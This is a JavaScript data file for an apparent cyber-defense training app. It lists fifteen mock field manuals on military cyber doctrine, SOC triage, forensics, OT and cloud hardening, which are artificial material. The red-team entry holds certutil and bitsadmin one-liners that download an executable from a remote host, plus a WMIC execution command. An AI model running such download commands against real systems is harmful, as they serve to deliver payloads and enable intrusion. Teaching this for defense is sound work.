// CYBEROPS DEFENSE COMMAND - Knowledge Books & Tactical Library
// 15 Comprehensive Books & Field Manuals for Defense Personnel and Cyber Specialists

export const BOOKS_DATA = [
  {
    id: 'book-tactical-defense',
    title: 'Tactical Cyber Defense Field Manual (FM 3-12)',
    author: 'Joint Doctrine Directorate / Armed Forces Cyber Command',
    category: 'Military Doctrine & Tactics',
    year: '2024 Edition',
    classification: 'RESTRICTED / OPERATIONAL TRAINING USE',
    coverGradient: 'from-emerald-900 to-slate-900',
    accentColor: '#10b981',
    summary: 'The definitive field manual outlining joint cyberspace operations, battlefield survivability in contested RF/electronic environments, and command-and-control network hardening for tactical units.',
    chapters: [
      {
        number: 1,
        title: 'Cyberspace Operations in the Multi-Domain Battlefield',
        content: `### Cyberspace Operations in the Multi-Domain Battlefield\n\n#### 1.1 Fundamentals of the Operational Environment\nCyberspace is an operational domain alongside land, maritime, air, and space. Modern combat brigades rely heavily on the electromagnetic spectrum and digital data links (tactical radios, satellite relays, UAV telemetry, and battle management systems).\n\n#### 1.2 Defensive Cyberspace Operations - Internal Defensive Measures (DCO-IDM)\n- **Continuous Host Telemetry**: Monitoring endpoints for unauthorized process executions.\n- **Dynamic Frequency Agility**: Switching tactical radio carrier frequencies automatically upon detection of RF jamming.\n- **Air-Gap Verification**: Enforcing physical isolation between unclassified logistics networks and classified tactical firing solutions.`
      },
      {
        number: 2,
        title: 'Tactical Operations Center (TOC) Network Hardening',
        content: `### Tactical Operations Center (TOC) Network Hardening\n\n#### 2.1 Perimeter Defense in Expeditionary Enclaves\n- **Physical Zone Perimeter**: Trench all fiber and copper cables or run them through armored conduits to prevent physical wiretaps.\n- **TEMPEST Shielding**: Position cryptographic servers inside RF-attenuated shelters to prevent side-channel eavesdropping.\n- **Emergency Zeroization**: In the event of imminent overrun, trigger the master Cryptographic Zeroize Switch on all tactical radios and crypto devices.`
      }
    ]
  },

  {
    id: 'book-art-cyber-war',
    title: 'The Art of Cyber Warfare: Military Strategy in the Fifth Domain',
    author: 'Brigadier K. S. Rathore (Retd.) & Cyber Defense Think Tank',
    category: 'Strategic Military Doctrine',
    year: '2023 Edition',
    classification: 'STRATEGIC DEFENSE STUDIES',
    coverGradient: 'from-blue-900 to-slate-900',
    accentColor: '#00f2fe',
    summary: 'Strategic doctrine analyzing nation-state asymmetric capabilities, weaponized zero-days, critical infrastructure targeting, and legal-ethical rules of engagement under international law.',
    chapters: [
      {
        number: 1,
        title: 'The Asymmetric Fifth Domain',
        content: `### The Asymmetric Fifth Domain\n\n#### 1.1 The Shift in National Power\nIn the 21st century, cyber warfare presents a profound asymmetric disruption: a sovereign nation\'s vital organs—electrical grids, nuclear reactors, and air traffic control systems—can be crippled by a small group of cyber operators operating from thousands of miles away under plausible deniability.`
      }
    ]
  },

  {
    id: 'book-rtfm',
    title: 'Red Team Field Manual (RTFM) - Tactical Offensive Playbook',
    author: 'Offensive Cyber Warfare Specialist Group',
    category: 'Offensive Operations / Red Teaming',
    year: '2024 Operator Edition',
    classification: 'RESTRICTED / AUTHORIZED SECURITY TESTING ONLY',
    coverGradient: 'from-red-900 to-slate-900',
    accentColor: '#ef4444',
    summary: 'Essential command-line syntax, living-off-the-land techniques, stealth lateral movement, and privilege escalation cheatsheets for red team operators and defense evaluators.',
    chapters: [
      {
        number: 1,
        title: 'Initial Access & Stealth Command Execution',
        content: `### Initial Access & Stealth Command Execution\n\n#### 1.1 Living off the Land (LOLBins) Cheatsheet\n- **CertUtil Download**: \`certutil -urlcache -split -f http://target.com/file.exe C:\\Temp\\file.exe\`\n- **BitsAdmin Transfer**: \`bitsadmin /transfer myDownloadJob /download http://target.com/file.exe C:\\Temp\\file.exe\`\n- **WMIC Execution**: \`wmic process call create "calc.exe"\``
      }
    ]
  },

  {
    id: 'book-blue-team-handbook',
    title: 'Blue Team Handbook: SOC Operations & Incident Response Edition',
    author: 'Defense SOC Training Command',
    category: 'Defensive Operations / SOC',
    year: '2024 Edition',
    classification: 'DEFENSIVE FIELD REFERENCE',
    coverGradient: 'from-amber-900 to-slate-900',
    accentColor: '#f59e0b',
    summary: 'The battle-tested manual for SOC analysts, threat hunters, and incident responders. Includes artifact triage, memory analysis, log correlation, and containment playbooks.',
    chapters: [
      {
        number: 1,
        title: 'Live System Triage & Artifact Collection',
        content: `### Live System Triage & Artifact Collection\n\n#### 1.1 Fast Windows Triage Checklist\n1. **Network Connections**: \`netstat -ano | findstr ESTABLISHED\`\n2. **Active Services**: \`Get-Service | Where-Object {$_.Status -eq "Running"}\`\n3. **Event IDs**: 4624 (Logon), 4625 (Failed Logon), 4688 (Process Creation).`
      }
    ]
  },

  {
    id: 'book-scada-defense',
    title: 'SCADA & Industrial Control Systems Security for Military Engineers',
    author: 'National Critical Infrastructure Security Council',
    category: 'Critical Infrastructure & OT',
    year: '2023 Edition',
    classification: 'RESTRICTED / OT OPERATIONAL SAFETY',
    coverGradient: 'from-cyan-900 to-slate-900',
    accentColor: '#00f2fe',
    summary: 'Comprehensive engineering guide for securing power stations, naval propulsion systems, water purification plants, and radar telemetry against kinetic cyber weapons.',
    chapters: [
      {
        number: 1,
        title: 'Securing the Purdue OT Architecture',
        content: `### Securing the Purdue OT Architecture\n\n#### 1.1 Golden Rules of OT Hardening\n1. No dual-homed servers bridging Level 3 and Level 4 directly.\n2. Unidirectional data diodes must enforce outbound-only transmission for historian replication.\n3. Patching must be rigorously validated on offline hardware test rigs before production deployment.`
      }
    ]
  },

  {
    id: 'book-practical-packet',
    title: 'Practical Packet Analysis: Wireshark in Hostile Environments',
    author: 'Tactical Signal Corps / Communications Command',
    category: 'Networking & Forensics',
    year: '2024 Field Edition',
    classification: 'TACTICAL COMMUNICATIONS MANUAL',
    coverGradient: 'from-purple-900 to-slate-900',
    accentColor: '#8b5cf6',
    summary: 'Mastering Wireshark and tcpdump for decoding malicious network traffic, identifying covert C2 channels, analyzing packet loss under jamming, and reconstructing data streams.',
    chapters: [
      {
        number: 1,
        title: 'Tactical Packet Capture & Display Filters',
        content: `### Tactical Packet Capture & Display Filters\n\n#### 1.1 Essential Display Filters\n- Cleartext Passwords: \`http.request.method == "POST" and (http contains "password" or http contains "pass")\`\n- Suspicious SMB: \`smb2.cmd == 5 and smb2.filename contains ".exe"\`\n- SYN Port Scan: \`tcp.flags.syn == 1 and tcp.flags.ack == 0\``
      }
    ]
  },

  {
    id: 'book-applied-crypto',
    title: 'Applied Military Cryptography & Secure Field Communications',
    author: 'Scientific Analysis Group (DRDO) & Armed Forces Cipher Bureau',
    category: 'Cryptography & Cipher Systems',
    year: '2023 Edition',
    classification: 'TOP SECRET / CIPHER OPERATIONS',
    coverGradient: 'from-emerald-950 to-slate-950',
    accentColor: '#10b981',
    summary: 'Cryptographic doctrine covering symmetric ciphers, public-key infrastructure, hardware security modules (HSMs), key management in field operations, and post-quantum transitions.',
    chapters: [
      {
        number: 1,
        title: 'Cryptographic Key Management in Tactical Formations',
        content: `### Cryptographic Key Management in Tactical Formations\n\n#### 1.1 Key Generation and Zeroization\nKeys must be produced using certified Hardware Random Number Generators (TRNGs). In case of emergency or physical breach, trigger zeroization immediately to scrub keys from volatile memory.`
      }
    ]
  },

  {
    id: 'book-ceh-companion',
    title: 'Certified Ethical Hacker (CEH) Tactical Defense Companion',
    author: 'Defense Cyber Training School',
    category: 'Certification & Tradecraft',
    year: '2024 Edition',
    classification: 'SPECIALIST STUDY & FIELD GUIDE',
    coverGradient: 'from-rose-900 to-slate-900',
    accentColor: '#f43f5e',
    summary: 'Comprehensive examination companion and field guide covering reconnaissance, scanning, system hacking, malware, social engineering, cryptography, and defense validation.',
    chapters: [
      {
        number: 1,
        title: 'Ethical Hacking Methodologies & Attack Vectors',
        content: `### Ethical Hacking Methodologies & Attack Vectors\n\n#### 1.1 The 5 Attack Phases\n1. Reconnaissance (OSINT)\n2. Scanning (Nmap)\n3. Gaining Access (Exploitation)\n4. Maintaining Access (Persistence)\n5. Clearing Tracks (Log scrubbing)`
      }
    ]
  },

  // 7 NEW KNOWLEDGE BOOKS (Total: 15 Books)
  {
    id: 'book-threat-hunting',
    title: 'Practical Threat Hunting & Threat Intelligence Handbook',
    author: 'Global Cyber Intelligence & Threat Research Institute',
    category: 'Threat Hunting & Intelligence',
    year: '2024 Tactical Edition',
    classification: 'TACTICAL THREAT INTELLIGENCE',
    coverGradient: 'from-indigo-900 to-slate-900',
    accentColor: '#6366f1',
    summary: 'Operational manual for proactively tracking nation-state APT campaigns, hunting anomalous adversary TTPs, and mapping telemetry to the MITRE ATT&CK enterprise matrix.',
    chapters: [
      {
        number: 1,
        title: 'The Hypothesis-Driven Threat Hunting Methodology',
        content: `### The Hypothesis-Driven Threat Hunting Methodology\n\n#### 1.1 Formulating Actionable Hypotheses\nThreat hunting begins not with mindless searching, but with an adversarial hypothesis: "Adversaries are abusing PowerShell scheduled tasks for persistence without writing executables to disk."\n\n#### 1.2 Telemetry Sources for Hunting\n- Sysmon Event ID 1 (Process Creation with Command Line)\n- Sysmon Event ID 7 (Image Loaded - DLL Injection)\n- Windows Event ID 4104 (PowerShell Script Block Logging)`
      }
    ]
  },

  {
    id: 'book-reverse-eng',
    title: 'Mastering Reverse Engineering & Malware Dissection',
    author: 'Cyber Defense Forensics Laboratory',
    category: 'Malware Analysis & Disassembly',
    year: '2024 Edition',
    classification: 'SPECIALIST CODE AUDIT',
    coverGradient: 'from-fuchsia-900 to-slate-900',
    accentColor: '#d946ef',
    summary: 'In-depth guide to static and dynamic binary analysis, x86/x64 assembly decompilation with Ghidra, unpacker scripting, and defeating anti-debugging techniques.',
    chapters: [
      {
        number: 1,
        title: 'x86_64 Assembly Fundamentals for Malware Analysts',
        content: `### x86_64 Assembly Fundamentals for Malware Analysts\n\n#### 1.1 Key CPU Registers\n- RAX / EAX: Return value of functions\n- RSP: Current stack pointer\n- RBP: Base frame pointer\n- RIP: Instruction pointer (points to next instruction to execute)\n\n#### 1.2 Common Anti-Debugging Tricks\n- \`IsDebuggerPresent\` API check via PEB (Process Environment Block)\n- \`rdtsc\` execution timing delta analysis`
      }
    ]
  },

  {
    id: 'book-osint-guide',
    title: 'OSINT Field Guide: Open Source Intelligence for Cyber Analysts',
    author: 'Strategic Intelligence & Defense Reconnaissance Bureau',
    category: 'Intelligence & Reconnaissance',
    year: '2024 Edition',
    classification: 'OPERATIONAL INTELLIGENCE',
    coverGradient: 'from-teal-900 to-slate-900',
    accentColor: '#14b8a6',
    summary: 'Comprehensive methodology for passive reconnaissance, satellite imagery geolocation, dark web indexing, domain infrastructure clustering, and digital footprint mapping.',
    chapters: [
      {
        number: 1,
        title: 'Digital Surface Mapping & Passive Infrastructure Enumeration',
        content: `### Digital Surface Mapping & Passive Infrastructure Enumeration\n\n#### 1.1 Passive vs Active Reconnaissance\nPassive OSINT never transmits a single probe packet to target infrastructure. Intelligence is derived from:\n- Certificate Transparency logs (crt.sh)\n- Passive DNS databases (SecurityTrails, DNSDB)\n- BGP route announcements and WHOIS records`
      }
    ]
  },

  {
    id: 'book-cloud-security',
    title: 'Cloud Security & Zero Trust Architecture Manual',
    author: 'Defense Enterprise Cloud Security Working Group',
    category: 'Cloud & Infrastructure Defense',
    year: '2024 Edition',
    classification: 'CLOUD ENTERPRISE HARDENING',
    coverGradient: 'from-sky-900 to-slate-900',
    accentColor: '#0ea5e9',
    summary: 'Hardening multi-cloud enclaves across AWS, Azure, and private defense clouds. Covers IMDSv2, CSPM, Kubernetes container isolation, and Zero Trust micro-segmentation.',
    chapters: [
      {
        number: 1,
        title: 'Securing Cloud Identity & Metadata Services',
        content: `### Securing Cloud Identity & Metadata Services\n\n#### 1.1 Defeating SSRF with IMDSv2\nIMDSv1 permits unauthenticated GET requests to \`http://169.254.169.254/latest/meta-data/\`. IMDSv2 mandates session tokens initiated via PUT requests, neutralizing Server-Side Request Forgery credential harvesting.`
      }
    ]
  },

  {
    id: 'book-ad-defense',
    title: 'Active Directory Enterprise Attack & Defense Playbook',
    author: 'Identity Defense & Kerberos Research Team',
    category: 'Identity & Access Management',
    year: '2024 Edition',
    classification: 'TIER-0 ENTERPRISE DEFENSE',
    coverGradient: 'from-violet-900 to-slate-900',
    accentColor: '#8b5cf6',
    summary: 'Complete guide to defending Active Directory against Kerberoasting, Pass-the-Hash, Golden Ticket forge attacks, DCSync domain replication, and BloodHound attack paths.',
    chapters: [
      {
        number: 1,
        title: 'Active Directory Tiered Administration Model',
        content: `### Active Directory Tiered Administration Model\n\n#### 1.1 The 3-Tier Security Isolation Model\n- **Tier 0**: Domain Controllers, PKI, and identity roots. Only Tier 0 admins log into Tier 0 assets.\n- **Tier 1**: Enterprise servers, database clusters, and cloud connectors.\n- **Tier 2**: End-user workstations and client printers. Never allow Tier 0 credentials on Tier 2 endpoints!`
      }
    ]
  },

  {
    id: 'book-digital-forensics',
    title: 'Digital Forensics & Memory Analysis Field Manual',
    author: 'Military Forensics & Evidence Analysis Unit',
    category: 'Digital Forensics & IR',
    year: '2024 Edition',
    classification: 'FORENSIC INVESTIGATION STANDARD',
    coverGradient: 'from-amber-950 to-slate-950',
    accentColor: '#f59e0b',
    summary: 'Step-by-step forensic procedures for physical drive bit-stream imaging, RAM extraction using Volatility 3, timeline analysis with plaso, and court-martial evidence integrity.',
    chapters: [
      {
        number: 1,
        title: 'RAM Extraction & Volatility 3 Plugin Workflows',
        content: `### RAM Extraction & Volatility 3 Plugin Workflows\n\n#### 1.1 Core Volatility Plugins\n- \`windows.pslist\`: Enumerate active processes from EPROCESS linked list\n- \`windows.psscan\`: Find unlinked, hidden malware processes\n- \`windows.netscan\`: Reconstruct active and terminated TCP/UDP sockets\n- \`windows.malfind\`: Detect unbacked memory pages with PAGE_EXECUTE_READWRITE permissions`
      }
    ]
  },

  {
    id: 'book-maritime-cyber',
    title: 'Maritime & Critical Infrastructure Cyber Resilience',
    author: 'Naval Cyber Defense Command & Maritime Security Bureau',
    category: 'Critical Infrastructure & OT',
    year: '2024 Edition',
    classification: 'SHIPBOARD & PORT SECURITY MANUAL',
    coverGradient: 'from-cyan-950 to-slate-950',
    accentColor: '#00f2fe',
    summary: 'Hardening naval warship bridges, cargo port container automation cranes, Electronic Chart Display Systems (ECDIS), and AIS radio beacons against electronic and cyber jamming.',
    chapters: [
      {
        number: 1,
        title: 'Warship Bridge System & ECDIS Navigation Hardening',
        content: `### Warship Bridge System & ECDIS Navigation Hardening\n\n#### 1.1 Countering GPS Circle Spoofing at Sea\nNaval vessels navigating contested waters must deploy multi-constellation anti-jam antennas and continuously cross-verify electronic GPS positions against physical inertial navigation and celestial sights.`
      }
    ]
  }
];
